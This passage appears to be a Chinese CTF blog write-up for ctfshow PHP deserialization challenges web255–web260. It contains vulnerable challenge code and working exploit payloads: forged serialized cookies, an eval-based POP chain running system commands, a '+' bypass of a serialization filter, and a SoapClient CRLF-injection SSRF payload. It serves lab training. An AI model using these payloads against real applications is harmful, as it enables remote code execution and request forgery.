class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>查看源码<br>依然需要通过GET传入参数username和password。值也是需要和ctfShowUser类里的一样。<br>区别在于，多了个COOKIE传参，我们需要通过COOKIE传入参数user.<br>由于后面需要参数isVip&#x3D;true，所以写脚本序列化后拿给user即可。</p>
+</li>
+<li><p>写脚本传参</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到序列化后的字符串，赋给user<br>COOKIE: <code>user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>GET: <code>?username=xxxxxx&amp;password=xxxxxx</code><br>成功拿到flag</p>
+</li>
+</ol>
+<h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题相较于上一题的区别在于多了验证变量username与password是否相等，不相等才能输出flag。</p>
+</li>
+<li><p>构造payload<br>脚本改造如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只需要将cookie的值改为这个脚本输出的值，并且get传入的参数与脚本username和password相等即可。<br>成功拿到flag</p>
+</li>
+</ol>
+<h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><code>__construct()函数</code><br>对象创建时自动调用，对对象进行初始化。</li>
+<li><code>__destruct()函数</code><br>当所有操作执行完毕后，有需要释放的对象会自动触发该方法。</li>
+</ul>
+<p>与之前相比变化的地方在于，public变量变为了private变量，并且ctfShowUser类里多了一个私有变量class，多了两个魔术方法与两个类<br>我们可以看到类backDoor里有我们需要的eval函数，通过这个函数执行我们想执行的代码。</p>
+<ol start="2">
+<li>构造payload<br>于是我们可以写如下脚本来或许序列化后的字符串：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+这个脚本将原本实例化类info的class变量改为了backDoor，并且在类backDoor里将变量code赋值为能够显示flag的代码。<br>系统命令可以用tac，tac是cat命令的反转，它使行逆序显示文件内容。也可以使用cat命令，但是需要在源码中找寻flag<br>GET参数与上一题不变：<br><code>?username=1&amp;password=2</code><br>成功拿到flag</li>
+</ol>
+<h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>与上一题的区别只是在于增加了过滤，不允许字母o或c后面出现数字，我们可以使用加号（+）绕过。如 O:+8</p>
+</li>
+<li><p>构造payload<br>脚本和上一题相似，但我们不使用urlencode了：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到的序列化字符如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;system(&quot;</span>tac flag.php<span class="string">&quot;);&quot;</span>;&#125;&#125; <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>将 O:数字 格式的所有数字前加上加号（+），并进行url编码，之后送给Cookie中的user<br>GET传参与上一题相同<br>成功拿到flag</p>
+</li>
+</ol>
+<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><ol>
+<li>查看源码<br>页面源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>
+flag.php源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+这道题所涵盖的知识很多，这里先贴两篇文章：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a><br><a href="https://www.secpulse.com/archives/165358.html">SoapClient</a></li>
+</ol>
+<ul>
+<li>CRLF<br>CRLF是回车和换行的简称 <code>\r\n</code><br>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</li>
+<li>SoapClient原生类<br>SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。<br>soap的拓展的安装，直接打开php.ini，找到extension&#x3D;soap，然后把前面的注释去掉，再重启服务即可。</li>
+<li>explode()函数<br>使用一个字符串分割另一个字符串<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explode(string $separator, string $string, int $limit = PHP_INT_MAX): array</span><br><span class="line">此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 separator 作为边界点分割出来。</span><br></pre></td></tr></table></figure>
+<a href="https://www.php.net/manual/zh/function.explode">官方文档</a></li>
+<li>array_pop()函数<br>弹出数组最后一个单元（出栈）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_pop(array &amp;$array): mixed</span><br><span class="line">array_pop() 弹出并返回 array 最后一个元素的值，并将 array 的长度减一。</span><br><span class="line">注意: 使用此函数后会重置（reset()）array 指针。</span><br></pre></td></tr></table></figure>
+<a href="https://www.php.net/manual/zh/function.array-pop">官方文档</a></li>
+</ul>
+<p>要得到flag，必须本地访问flag.php而且带上token。因为本题有cloudfare代理，无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p>
+<ol start="2">
+<li>构造payload<br>首先脚本如下：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+location就是我们要访问的url，其中uri也是不可缺少的，但是其实没什么用。关键就是因为我们可以控制user_agent，所以可以CRLF注入。<br>因为Content-length的缘故，post只取到token&#x3D;ctfshow，其它不需要的部分被丢弃，实现了自己构造POST的请求包。<br>最后将得到的经过url编码后序列化字符串通过GET方式给变量vip，即构造payload为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+最后访问flag.txt，即可拿到flag。</li>
+</ol>
+<h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过GET方式传入变量ctfshow，需要包含preg_match里的字符串</p>
+</li>
+<li><p>构造payload<br>直接构造为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure>
+<p>成功拿到flag</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>反序列化</category>
+      </categories>
